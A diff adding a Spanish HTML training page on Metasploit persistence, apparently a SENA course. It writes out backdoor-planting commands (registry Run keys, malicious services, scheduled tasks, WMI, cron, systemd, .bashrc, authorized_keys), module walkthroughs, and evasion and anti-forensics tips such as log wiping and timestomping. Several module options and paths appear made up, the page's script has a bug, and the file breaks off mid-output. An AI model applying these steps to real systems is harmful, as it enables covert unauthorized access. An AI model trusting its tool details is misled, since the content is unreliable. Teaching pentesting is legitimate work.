@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guía Avanzada de Persistencia en Pentesting con Metasploit</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        header {
+            background-color: #333;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 5px solid #28a745;
+        }
+        header img {
+            height: 50px;
+            margin-right: 15px;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 1.8em;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .sidebar {
+            width: 250px;
+            float: left;
+            padding-right: 20px;
+            border-right: 1px solid #eee;
+        }
+        .sidebar ul {
+            list-style: none;
+            padding: 0;
+        }
+        .sidebar ul li {
+            margin-bottom: 10px;
+        }
+        .sidebar ul li a {
+            text-decoration: none;
+            color: #007bff;
+            font-weight: bold;
+            display: block;
+            padding: 8px 10px;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+        .sidebar ul li a:hover, .sidebar ul li a.active {
+            background-color: #e9ecef;
+            color: #0056b3;
+        }
+        .content {
+            margin-left: 270px;
+            padding-left: 20px;
+        }
+        .section {
+            display: none;
+            margin-bottom: 30px;
+        }
+        .section.active {
+            display: block;
+        }
+        h2 {
+            color: #007bff;
+            border-bottom: 2px solid #007bff;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        h3 {
+            color: #28a745;
+            margin-top: 25px;
+            margin-bottom: 15px;
+        }
+        pre {
+            background-color: #e9ecef;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9em;
+            white-space: pre-wrap; /* Permite que el texto se ajuste */
+            word-wrap: break-word; /* Rompe palabras largas */
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #f0f0f0;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+        .button-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .next-button, .prev-button, .check-button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            margin: 0 10px;
+            transition: background-color 0.3s ease;
+        }
+        .next-button:hover, .prev-button:hover, .check-button:hover {
+            background-color: #0056b3;
+        }
+        .exercise-input {
+            width: 80%;
+            padding: 8px;
+            margin-top: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .feedback {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+        .feedback.correct {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .feedback.incorrect {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .demonstration {
+            background-color: #e9ecef;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 5px solid #28a745;
+            margin-top: 20px;
+            animation: fadeIn 1s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .demonstration-step {
+            margin-bottom: 10px;
+            padding-left: 15px;
+            position: relative;
+        }
+        .demonstration-step::before {
+            content: '➤';
+            position: absolute;
+            left: 0;
+            color: #28a745;
+        }
+        .demonstration h4 {
+            color: #007bff;
+            margin-bottom: 10px;
+        }
+        .interactive-terminal {
+            background-color: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', Courier, monospace;
+            min-height: 150px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 15px;
+            resize: vertical;
+        }
+        .typing-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 14px;
+            background-color: #0f0;
+            animation: blink-caret .75s step-end infinite;
+        }
+        @keyframes blink-caret {
+            from, to { background-color: transparent }
+            50% { background-color: #0f0; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://i.postimg.cc/mZzx20gW/Logosimbolo-SENA-PRINCIPAL.png" alt="Logo SENA">
+        <h1>Centro de Servicios y Gestión Empresarial</h1>
+    </header>
+
+    <div class="container">
+        <div class="sidebar">
+            <ul>
+                <li><a href="#" data-section="intro" class="active">Introducción a la Persistencia</a></li>
+                <li><a href="#" data-section="windows-techniques">Técnicas de Persistencia en Windows</a></li>
+                <li><a href="#" data-section="linux-techniques">Técnicas de Persistencia en Linux</a></li>
+                <li><a href="#" data-section="metasploit-modules">Módulos de Metasploit para Persistencia</a></li>
+                <li><a href="#" data-section="windows-demo">Demo: Persistencia en Windows</a></li>
+                <li><a href="#" data-section="linux-demo">Demo: Persistencia en Linux</a></li>
+                <li><a href="#" data-section="exercise-windows">Ejercicio Práctico: Windows</a></li>
+                <li><a href="#" data-section="exercise-linux">Ejercicio Práctico: Linux</a></li>
+                <li><a href="#" data-section="advanced-considerations">Consideraciones Avanzadas y Anti-Forensics</a></li>
+            </ul>
+        </div>
+
+        <div class="content">
+            <div id="intro" class="section active">
+                <h2>Introducción a la Persistencia</h2>
+                <h3>¿Qué es la Persistencia en Pentesting?</h3>
+                <p>La persistencia en el pentesting se refiere a la capacidad de mantener el acceso a un sistema comprometido, incluso después de que el sistema se reinicie, las credenciales cambien o la sesión inicial se pierda. Es una fase crítica post-explotación que asegura que el atacante (en este caso, el pentester) pueda regresar al sistema cuando lo necesite para continuar con otras actividades como la exfiltración de datos, escalada de privilegios o pivoteo.</p>
+
+                <h3>Importancia de la Persistencia</h3>
+                <ul>
+                    <li><strong>Mantenimiento del Acceso:</strong> Asegura un punto de entrada continuo al sistema objetivo.</li>
+                    <li><strong>Recuperación de Sesiones:</strong> Permite recuperar el control si la sesión inicial se cae.</li>
+                    <li><strong>Evitar la Redetección:</strong> Una vez establecida, a menudo es más difícil de detectar que la explotación inicial.</li>
+                    <li><strong>Continuidad de Operaciones:</strong> Facilita la ejecución de fases posteriores del pentesting sin tener que reiniciar todo el proceso de intrusión.</li>
+                </ul>
+
+                <h3>Conceptos Clave</h3>
+                <ul>
+                    <li><strong>Backdoors:</strong> Puertas traseras ocultas para acceder al sistema.</li>
+                    <li><strong>Rootkits:</strong> Herramientas que permiten ocultar procesos, archivos y actividad.</li>
+                    <li><strong>Shells Persistentes:</strong> Conexiones inversas que se restablecen automáticamente.</li>
+                    <li><strong>Mecanismos de Inicio Automático:</strong> Aprovechar funciones del sistema operativo que inician programas al arrancar.</li>
+                </ul>
+                <div class="button-container">
+                    <button class="next-button" onclick="showNextSection()">Siguiente</button>
+                </div>
+            </div>
+
+            <div id="windows-techniques" class="section">
+                <h2>Técnicas de Persistencia en Windows</h2>
+                <h3>1. Ejecución Automática (Startup)</h3>
+                <p>Los programas ubicados en las carpetas de inicio automático se ejecutan cada vez que el usuario inicia sesión. Esto es una forma sencilla de establecer persistencia.</p>
+                <p><strong>Rutas Comunes:</strong></p>
+                <pre>
+C:\Users\&lt;Username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+                </pre>
+
+                <h3>2. Entradas del Registro (Registry Run Keys)</h3>
+                <p>Las claves de registro <code>Run</code> y <code>RunOnce</code> son ubicaciones muy comunes para establecer persistencia. Los programas especificados aquí se ejecutan al inicio del sistema o al inicio de sesión del usuario.</p>
+                <p><strong>Claves Comunes:</strong></p>
+                <pre>
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run (para 64-bit)
+                </pre>
+                <p><strong>Comando para agregar una entrada (ejemplo):</strong></p>
+                <pre>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "MyBackdoor" /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f</pre>
+
+                <h3>3. Servicios de Windows</h3>
+                <p>Los servicios de Windows se ejecutan en segundo plano, a menudo con privilegios elevados, y pueden configurarse para iniciarse automáticamente al arrancar el sistema. Es una técnica muy robusta para la persistencia.</p>
+                <p><strong>Comandos para crear un servicio (ejemplo):</strong></p>
+                <pre>
+sc create MyMaliciousService binPath= "C:\Users\Public\backdoor.exe" DisplayName= "My Super Important Service" start= auto
+sc start MyMaliciousService
+                </pre>
+
+                <h3>4. Tareas Programadas (Scheduled Tasks)</h3>
+                <p>Las tareas programadas permiten ejecutar programas en momentos específicos o en respuesta a eventos. Pueden configurarse para ejecutarse con los privilegios del usuario o del sistema.</p>
+                <p><strong>Comando para crear una tarea (ejemplo):</strong></p>
+                <pre>
+schtasks /create /tn "MyPersistTask" /tr "C:\Users\Public\backdoor.exe" /sc ONLOGON /rl HIGHEST /f
+                </pre>
+
+                <h3>5. DLL Hijacking</h3>
+                <p>Aprovecha cómo Windows busca y carga las DLLs. Si un programa busca una DLL que no está en la ruta esperada, y un atacante coloca una DLL maliciosa en una ruta prioritaria, el programa cargará la DLL maliciosa.</p>
+
+                <h3>6. WMI (Windows Management Instrumentation)</h3>
+                <p>WMI es una interfaz para gestionar componentes de Windows. Permite crear eventos que, cuando se disparan, ejecutan código. Es una técnica muy sigilosa.</p>
+                <p><strong>Ejemplo conceptual de WMI:</strong></p>
+                <pre>
+// WMI Event Filter (ejecutar cada X segundos)
+__EventFilter.Name="MyEventFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __IntervalTimerInstruction WHERE IntervalBetweenEvents = 5000"
+
+// WMI Event Consumer (qué ejecutar)
+CommandLineEventConsumer.Name="MyConsumer", CommandLineTemplate="C:\Users\Public\backdoor.exe"
+
+// Binding Filter to Consumer (unir)
+__FilterToConsumerBinding.Filter="__EventFilter.Name='MyEventFilter'", Consumer="CommandLineEventConsumer.Name='MyConsumer'"
+                </pre>
+                <div class="button-container">
+                    <button class="prev-button" onclick="showPrevSection()">Anterior</button>
+                    <button class="next-button" onclick="showNextSection()">Siguiente</button>
+                </div>
+            </div>
+
+            <div id="linux-techniques" class="section">
+                <h2>Técnicas de Persistencia en Linux</h2>
+                <h3>1. Crontab</h3>
+                <p>Crontab es el programador de tareas en sistemas Unix/Linux. Permite ejecutar comandos o scripts a intervalos regulares.</p>
+                <p><strong>Editar Crontab:</strong></p>
+                <pre>crontab -e</pre>
+                <p><strong>Ejemplo de entrada en Crontab (ejecutar cada minuto):</strong></p>
+                <pre>
+* * * * * /bin/bash /path/to/my/backdoor.sh
+                </pre>
+                <p>También se puede agregar al crontab de un usuario específico o al sistema entero:</p>
+                <pre>
+/etc/crontab
+/etc/cron.d/
+/etc/cron.hourly/
+/etc/cron.daily/
+/etc/cron.weekly/
+/etc/cron.monthly/
+                </pre>
+
+                <h3>2. Systemd Services</h3>
+                <p>Systemd es el sistema de inicialización y gestor de servicios principal en muchas distribuciones Linux modernas (Ubuntu, Debian, Fedora, CentOS). Permite crear servicios que se inician al arrancar el sistema.</p>
+                <p><strong>Ejemplo de archivo de servicio Systemd (<code>/etc/systemd/system/mybackdoor.service</code>):</strong></p>
+                <pre>
+[Unit]
+Description=My Backdoor Service
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 /opt/backdoor.py
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+                </pre>
+                <p><strong>Comandos para habilitar y iniciar el servicio:</strong></p>
+                <pre>
+sudo systemctl enable mybackdoor.service
+sudo systemctl start mybackdoor.service
+                </pre>
+
+                <h3>3. Archivos de Inicio del Usuario (.bashrc, .profile, .zshrc, etc.)</h3>
+                <p>Estos archivos se ejecutan cada vez que un usuario inicia una sesión de shell. Son útiles para la persistencia a nivel de usuario.</p>
+                <p><strong>Ejemplo de adición a <code>.bashrc</code>:</strong></p>
+                <pre>
+echo 'python3 /tmp/backdoor.py &' >> ~/.bashrc
+                </pre>
+
+                <h3>4. /etc/rc.local</h3>
+                <p>En sistemas más antiguos o en algunas configuraciones, <code>/etc/rc.local</code> es un script que se ejecuta al final del proceso de arranque. En sistemas modernos con Systemd, su uso ha disminuido, pero aún puede estar presente o ser habilitado.</p>
+                <pre>
+#!/bin/sh -e
+#
+# rc.local
+#
+/usr/bin/python3 /opt/mybackdoor.py &
+exit 0
+                </pre>
+
+                <h3>5. SSH Authorized Keys</h3>
+                <p>Si se tiene acceso a la clave privada del usuario o se puede añadir una nueva clave pública al archivo <code>~/.ssh/authorized_keys</code>, se puede acceder al sistema vía SSH sin contraseña.</p>
+                <pre>
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.ssh/authorized_keys
+                </pre>
+
+                <h3>6. Rootkits y Backdoors a Nivel de Kernel</h3>
+                <p>Técnicas más avanzadas que implican la modificación del kernel o la instalación de módulos del kernel para ocultar actividad y mantener el acceso. Requieren un conocimiento profundo del funcionamiento del kernel.</p>
+                <div class="button-container">
+                    <button class="prev-button" onclick="showPrevSection()">Anterior</button>
+                    <button class="next-button" onclick="showNextSection()">Siguiente</button>
+                </div>
+            </div>
+
+            <div id="metasploit-modules" class="section">
+                <h2>Módulos de Metasploit para Persistencia</h2>
+                <p>Metasploit Framework ofrece varios módulos post-explotación para establecer persistencia en sistemas Windows y Linux.</p>
+
+                <h3>Para Windows:</h3>
+                <ul>
+                    <li><strong><code>post/windows/manage/persistence_exe</code>:</strong>
+                        <p>Este módulo permite establecer persistencia mediante la creación de un servicio o una clave de registro Run. Puedes especificar el tipo de persistencia, el payload y los privilegios.</p>
+                        <pre>
+msf6 &gt; use post/windows/manage/persistence_exe
+msf6 post(windows/manage/persistence_exe) &gt; show options
+msf6 post(windows/manage/persistence_exe) &gt; set SESSION 1
+msf6 post(windows/manage/persistence_exe) &gt; set REXENAME evil.exe
+msf6 post(windows/manage/persistence_exe) &gt; set RPATH C:\\Users\\Public\\
+msf6 post(windows/manage/persistence_exe) &gt; set STARTUP L
+msf6 post(windows/manage/persistence_exe) &gt; set REGISTRY_KEY "HKCU"
+msf6 post(windows/manage/persistence_exe) &gt; set USERNAME "Admin"
+msf6 post(windows/manage/persistence_exe) &gt; run
+                        </pre>
+                        <p>Donde <code>STARTUP</code> puede ser:</p>
+                        <ul>
+                            <li><code>U</code>: User startup (current user's Startup folder)</li>
+                            <li><code>S</code>: Service (creates a new service)</li>
+                            <li><code>R</code>: Registry (HKCU or HKLM Run key)</li>
+                            <li><code>L</code>: LocalSystem (HLKM Run key or LocalSystem service)</li>
+                            <li><code>A</code>: All (tries all available methods)</li>
+                        </ul>
+                    </li>
+                    <li><strong><code>post/windows/manage/persistence_service</code>:</strong>
+                        <p>Crea un servicio persistente en el sistema objetivo.</p>
+                        <pre>
+msf6 &gt; use post/windows/manage/persistence_service
+msf6 post(windows/manage/persistence_service) &gt; show options
+msf6 post(windows/manage/persistence_service) &gt; set SESSION 1
+msf6 post(windows/manage/persistence_service) &gt; set REXENAME back.exe
+msf6 post(windows/manage/persistence_service) &gt; set RPATH C:\\Windows\\temp\\
+msf6 post(windows/manage/persistence_service) &gt; run
+                        </pre>
+                    </li>
+                    <li><strong><code>exploit/windows/local/s4u_persistence</code>:</strong>
+                        <p>Aprovecha el mecanismo S4U (Services for User) de Kerberos para la persistencia. Requiere privilegios administrativos y un controlador de dominio.</p>
+                    </li>
+                </ul>
+
+                <h3>Para Linux:</h3>
+                <ul>
+                    <li><strong><code>post/linux/manage/persistence</code>:</strong>
+                        <p>Este módulo puede establecer persistencia utilizando Crontab o Systemd en sistemas Linux.</p>
+                        <pre>
+msf6 &gt; use post/linux/manage/persistence
+msf6 post(linux/manage/persistence) &gt; show options
+msf6 post(linux/manage/persistence) &gt; set SESSION 2
+msf6 post(linux/manage/persistence) &gt; set RHOSTS &lt;Target_IP&gt;
+msf6 post(linux/manage/persistence) &gt; set LHOST &lt;Your_IP&gt;
+msf6 post(linux/manage/persistence) &gt; set LPORT 4444
+msf6 post(linux/manage/persistence) &gt; set METHOD CRONTAB  (or SYSTEMD)
+msf6 post(linux/manage/persistence) &gt; run
+                        </pre>
+                        <p>Donde <code>METHOD</code> puede ser <code>CRONTAB</code> o <code>SYSTEMD</code>.</p>
+                    </li>
+                    <li><strong><code>post/linux/manage/ssh_persistence</code>:</strong>
+                        <p>Añade una clave SSH pública al archivo <code>authorized_keys</code> para permitir el acceso SSH sin contraseña.</p>
+                        <pre>
+msf6 &gt; use post/linux/manage/ssh_persistence
+msf6 post(linux/manage/ssh_persistence) &gt; show options
+msf6 post(linux/manage/ssh_persistence) &gt; set SESSION 2
+msf6 post(linux/manage/ssh_persistence) &gt; run
+                        </pre>
+                    </li>
+                </ul>
+                <div class="button-container">
+                    <button class="prev-button" onclick="showPrevSection()">Anterior</button>
+                    <button class="next-button" onclick="showNextSection()">Siguiente</button>
+                </div>
+            </div>
+
+            <div id="windows-demo" class="section">
+                <h2>Demostración Visual: Persistencia en Windows con Metasploit (Servicio)</h2>
+                <p>En esta demostración, simularemos la creación de un servicio persistente en un sistema Windows comprometido usando Metasploit.</p>
+
+                <div class="demonstration">
+                    <h4>Paso 1: Obtener una sesión de Meterpreter</h4>
+                    <p>Asumimos que ya tienes una sesión de Meterpreter activa con privilegios de administrador. Si no, necesitarías explotar una vulnerabilidad para obtener una.</p>
+                    <pre><code>msf6 &gt; sessions -i 1</code></pre>
+                    <p>Simulamos la salida de una sesión activa:</p>
+                    <div class="interactive-terminal" id="win-demo-step1-output"></div>
+
+                    <h4>Paso 2: Usar el módulo <code>persistence_service</code></h4>
+                    <p>Cargamos el módulo y configuramos las opciones necesarias.</p>
+                    <pre><code>msf6 &gt; use post/windows/manage/persistence_service
+msf6 post(windows/manage/persistence_service) &gt; set SESSION 1
+msf6 post(windows/manage/persistence_service) &gt; set REXENAME backdoor.exe
+msf6 post(windows/manage/persistence_service) &gt; set RPATH C:\\Windows\\Temp\\
+msf6 post(windows/manage/persistence_service) &gt; show options
+msf6 post(windows/manage/persistence_service) &gt; run</code></pre>
+                    <p>Simulamos la ejecución y el resultado:</p>
+                    <div class="interactive-terminal" id="win-demo-step2-output"></div>
+
+                    <h4>Paso 3: Verificación en el sistema objetivo (simulado)</h4>
+                    <p>Después de ejecutar el módulo, el payload se habrá cargado y el servicio se habrá creado. Reiniciamos el sistema simulado para comprobar la persistencia.</p>
+                    <pre><code>meterpreter &gt; shutdown -r</code></pre>
+                    <p>Simulamos el reinicio y la reconexión:</p>
+                    <div class="interactive-terminal" id="win-demo-step3-output"></div>
+
+                    <h4>Paso 4: Conectar a la nueva sesión persistente (simulado)</h4>
+                    <p>Una vez que el sistema se reinicia y el servicio se inicia, deberíamos ver una nueva sesión de Meterpreter entrante.</p>
+                    <pre><code>msf6 &gt; sessions -l</code></pre>
+                    <p>Simulamos la reconexión y una nueva sesión:</p>
+                    <div class="interactive-terminal" id="win-demo-step4-output"></div>
+                </div>
+                <div class="button-container">
+                    <button class="prev-button" onclick="showPrevSection()">Anterior</button>
+                    <button class="next-button" onclick="showNextSection()">Siguiente</button>
+                </div>
+            </div>
+
+            <div id="linux-demo" class="section">
+                <h2>Demostración Visual: Persistencia en Linux con Metasploit (Crontab)</h2>
+                <p>En esta demostración, simularemos el establecimiento de persistencia en un sistema Linux utilizando Crontab a través de Metasploit.</p>
+
+                <div class="demonstration">
+                    <h4>Paso 1: Obtener una sesión de Meterpreter</h4>
+                    <p>Asumimos que ya tienes una sesión de Meterpreter activa en el sistema Linux.</p>
+                    <pre><code>msf6 &gt; sessions -i 2</code></pre>
+                    <p>Simulamos la salida de una sesión activa:</p>
+                    <div class="interactive-terminal" id="linux-demo-step1-output"></div>
+
+                    <h4>Paso 2: Usar el módulo <code>persistence</code> para Linux</h4>
+                    <p>Cargamos el módulo <code>post/linux/manage/persistence</code> y configuramos las opciones para usar Crontab.</p>
+                    <pre><code>msf6 &gt; use post/linux/manage/persistence
+msf6 post(linux/manage/persistence) &gt; show options
+msf6 post(linux/manage/persistence) &gt; set SESSION 2
+msf6 post(linux/manage/persistence) &gt; set LHOST &lt;Your_Kali_IP&gt;
+msf6 post(linux/manage/persistence) &gt; set LPORT 4445
+msf6 post(linux/manage/persistence) &gt; set METHOD CRONTAB
+msf6 post(linux/manage/persistence) &gt; run</code></pre>
+                    <p>Simulamos la ejecución y el resultado:</p>
+                    <div class="interactive-terminal" id="linux-demo-step2-output"></div>
+
+                    <h4>Paso 3: Verificación en el sistema objetivo (simulado)</h4>
+                    <p>Una vez que el módulo se ejecuta, se habrá creado una entrada en el Crontab del usuario o del sistema. Simulemos el reinicio del sistema o el tiempo de ejecución del cronjob.</p>
+                    <pre><code>meterpreter &gt; shell
+# (en la shell de Linux)
+# cat /var/spool/cron/crontabs/&lt;user&gt;  (o crontab -l)
+# sudo reboot</code></pre>
+                    <p>Simulamos el reinicio y la reconexión:</p>
+                    <div class="interactive-terminal" id="linux-demo-step3-output"></div>
+
+                    <h4>Paso 4: Conectar a la nueva sesión persistente (simulado)</h4>
+                    <p>Deberíamos ver una nueva sesión de Meterpreter entrante en el LPORT especificado.</p>
+                    <pre><code>msf6 &gt; sessions -l</code></pre>
+                    <p>Simulamos la reconexión y una nueva sesión:</p>
+                    <div class="interactive-terminal" id="linux-demo-step4-output"></div>
+                </div>
+                <div class="button-container">
+                    <button class="prev-button" onclick="showPrevSection()">Anterior</button>
+                    <button class="next-button" onclick="showNextSection()">Siguiente</button>
+                </div>
+            </div>
+
+            <div id="exercise-windows" class="section">
+                <h2>Ejercicio Práctico: Persistencia en Windows</h2>
+                <p><strong>Escenario:</strong> Has comprometido un sistema Windows y tienes una sesión de Meterpreter activa con privilegios de administrador. Tu objetivo es establecer persistencia usando el registro de Windows (Run key) para un payload que se ejecute al inicio de sesión del usuario.</p>
+                <p><strong>Tarea:</strong> Utiliza el módulo <code>post/windows/manage/persistence_exe</code> en Metasploit. Configura el módulo para que el payload (llamémoslo <code>evil.exe</code>) se guarde en <code>C:\ProgramData\</code> y se inicie desde la clave de registro HKCU Run.</p>
+
+                <h3>Instrucciones:</h3>
+                <ol>
+                    <li>Asume que tienes una sesión de Meterpreter activa con <code>SESSION 1</code>.</li>
+                    <li>Carga el módulo de Metasploit adecuado.</li>
+                    <li>Configura las opciones <code>SESSION</code>, <code>REXENAME</code>, <code>RPATH</code> y <code>STARTUP</code>.</li>
+                    <li>Ejecuta el módulo.</li>
+                </ol>
+
+                <p><strong>Pregunta:</strong> ¿Qué comando Metasploit utilizarías para establecer la ruta de guardado del ejecutable malicioso?</p>
+                <input type="text" id="win-exercise-q1" class="exercise-input" placeholder="Ej: set RPATH ...">
+                <div id="win-exercise-feedback1" class="feedback"></div>
+
+                <p><strong>Pregunta:</strong> ¿Qué valor deberías asignar a la opción <code>STARTUP</code> para lograr la persistencia en la clave de registro HKCU Run al inicio de sesión?</p>
+                <input type="text" id="win-exercise-q2" class="exercise-input" placeholder="Ej: set STARTUP ...">
+                <div id="win-exercise-feedback2" class="feedback"></div>
+
+                <div class="button-container">
+                    <button class="check-button" onclick="checkWindowsExercise()">Verificar Respuestas</button>
+                    <button class="prev-button" onclick="showPrevSection()">Anterior</button>
+                    <button class="next-button" onclick="showNextSection()">Siguiente</button>
+                </div>
+            </div>
+
+            <div id="exercise-linux" class="section">
+                <h2>Ejercicio Práctico: Persistencia en Linux</h2>
+                <p><strong>Escenario:</strong> Has comprometido un sistema Linux y tienes una sesión de Meterpreter activa. Tu objetivo es establecer persistencia usando Crontab, de modo que el sistema te envíe una nueva sesión cada minuto.</p>
+                <p><strong>Tarea:</strong> Utiliza el módulo <code>post/linux/manage/persistence</code> en Metasploit. Configura el módulo para que use el método Crontab y especifica un LPORT diferente al que utilizaste para obtener la sesión inicial (por ejemplo, 4446).</p>
+
+                <h3>Instrucciones:</h3>
+                <ol>
+                    <li>Asume que tienes una sesión de Meterpreter activa con <code>SESSION 2</code> y tu IP de Kali es <code>192.168.1.100</code>.</li>
+                    <li>Carga el módulo de Metasploit adecuado.</li>
+                    <li>Configura las opciones <code>SESSION</code>, <code>LHOST</code>, <code>LPORT</code> y <code>METHOD</code>.</li>
+                    <li>Ejecuta el módulo.</li>
+                </ol>
+
+                <p><strong>Pregunta:</strong> ¿Qué valor deberías asignar a la opción <code>METHOD</code> para establecer persistencia usando Crontab?</p>
+                <input type="text" id="linux-exercise-q1" class="exercise-input" placeholder="Ej: set METHOD ...">
+                <div id="linux-exercise-feedback1" class="feedback"></div>
+
+                <p><strong>Pregunta:</strong> Si quieres que el payload se conecte a tu máquina en el puerto 4446, ¿qué comando usarías para configurar el puerto de escucha?</p>
+                <input type="text" id="linux-exercise-q2" class="exercise-input" placeholder="Ej: set LPORT ...">
+                <div id="linux-exercise-feedback2" class="feedback"></div>
+
+                <div class="button-container">
+                    <button class="check-button" onclick="checkLinuxExercise()">Verificar Respuestas</button>
+                    <button class="prev-button" onclick="showPrevSection()">Anterior</button>
+                    <button class="next-button" onclick="showNextSection()">Siguiente</button>
+                </div>
+            </div>
+
+            <div id="advanced-considerations" class="section">
+                <h2>Consideraciones Avanzadas y Anti-Forensics</h2>
+                <h3>Ofuscación y Evasión</h3>
+                <ul>
+                    <li><strong>Codificación de Payloads:</strong> Usar encoders de Metasploit (<code>msfvenom -e</code>) o herramientas de terceros como Veil-Evasion para hacer los payloads indetectables por antivirus.</li>
+                    <li><strong>Uso de Stagers Pequeños:</strong> Minimizar el tamaño del payload inicial y descargar el resto del código en memoria.</li>
+                    <li><strong>Inyección de Procesos:</strong> Inyectar el código malicioso en procesos legítimos para camuflarse.</li>
+                    <li><strong>Reflective DLL Injection:</strong> Cargar DLLs directamente en la memoria de un proceso sin escribirlas en el disco.</li>
+                </ul>
+
+                <h3>Anti-Forensics</h3>
+                <ul>
+                    <li><strong>Limpieza de Rastros:</strong> Eliminar logs, historial de comandos, y cualquier archivo temporal.</li>
+                    <li><strong>Timestomp:</strong> Modificar los timestamps de archivos (creación, modificación, acceso) para que coincidan con archivos legítimos y ocultar la actividad.</li>
+                    <li><strong>Borrado Seguro de Archivos:</strong> Utilizar herramientas para sobrescribir los datos de los archivos varias veces, haciendo la recuperación casi imposible.</li>
+                    <li><strong>Uso de Memoria Solamente:</strong> Realizar la mayor parte de la actividad en memoria, evitando escribir en el disco.</li>
+                </ul>
+
+                <h3>Defensa y Detección</h3>
+                <ul>
+                    <li><strong>Monitoreo de Integridad de Archivos:</strong> Herramientas como Tripwire o AIDE detectan cambios en archivos críticos del sistema.</li>
+                    <li><strong>Análisis de Logs:</strong> Monitorear logs de seguridad (Event Viewer en Windows, Syslog en Linux) en busca de actividades sospechosas (nuevos servicios, tareas programadas, entradas de registro).</li>
+                    <li><strong>Análisis de Comportamiento (EDR/XDR):</strong> Soluciones avanzadas que detectan patrones de comportamiento anómalos.</li>
+                    <li><strong>Segmentación de Red:</strong> Limitar el movimiento lateral en caso de compromiso.</li>
+                    <li><strong>Principios de Mínimo Privilegio:</strong> Asegurar que los usuarios y aplicaciones solo tengan los permisos necesarios.</li>
+                </ul>
+                <div class="button-container">
+                    <button class="prev-button" onclick="showPrevSection()">Anterior</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const sections = document.querySelectorAll('.section');
+        const sidebarLinks = document.querySelectorAll('.sidebar ul li a');
+        let currentSectionIndex = 0;
+
+        function showSection(index) {
+            sections.forEach((section, i) => {
+                if (i === index) {
+                    section.classList.add('active');
+                } else {
+                    section.classList.remove('active');
+                }
+            });
+
+            sidebarLinks.forEach((link, i) => {
+                if (link.dataset.section === sections[index].id) {
+                    link.classList.add('active');
+                } else {
+                    link.classList.remove('active');
+                }
+            });
+            currentSectionIndex = index;
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function showNextSection() {
+            if (currentSectionIndex < sections.length - 1) {
+                showSection(currentSectionIndex + 1);
+            }
+        }
+
+        function showPrevSection() {
+            if (currentSectionIndex > 0) {
+                showSection(currentSectionIndex - 1);
+            }
+        }
+
+        sidebarLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const targetId = e.target.dataset.section;
+                const targetIndex = Array.from(sections).findIndex(section => section.id === targetId);
+                showSection(targetIndex);
+            });
+        });
+
+        // Demostraciones visuales interactivas (simulaciones de terminal)
+        function typeWriter(elementId, text, delay = 50) {
+            const element = document.getElementById(elementId);
+            element.innerHTML = '';
+            let i = 0;
+            const typingInterval = setInterval(() => {
+                if (i < text.length) {
+                    if (text.substring(i, i + 4) === '&#x2588;') { // Check for block character
+                        element.innerHTML += '<span class="typing-indicator"></span>';
+                        i += 8; // Advance past the html entity
+                    } else {
+                        element.innerHTML += text.charAt(i);
+                        i++;
+                    }
+                    element.scrollTop = element.scrollHeight; // Scroll to bottom
+                } else {
+                    clearInterval(typingInterval);
+                }
+            }, delay);
+        }
+
+        function runDemoStep1Windows() {
+            const output = `
+msf6 > sessions -i 1
+
+[*] Starting interaction with 1...
+
+meterpreter > sysinfo
+Computer        : TARGET-PC
+OS              : Windows 10 (Build 19045).
+Architecture    : x64
+System Language : en_US
+Meterpreter     : x64/windows
+            `.trim();
+            typeWriter('win-demo-step1-output', output);
+        }
+
+        function runDemoStep2Windows() {
+            const output = `
+msf6 post(windows/manage/persistence_service) > run
+
+[*] Running module against TARGET-PC
+[*] Setting up Meterpreter to migrate to explorer.exe...
+[*] Creating service 'MetSvc'
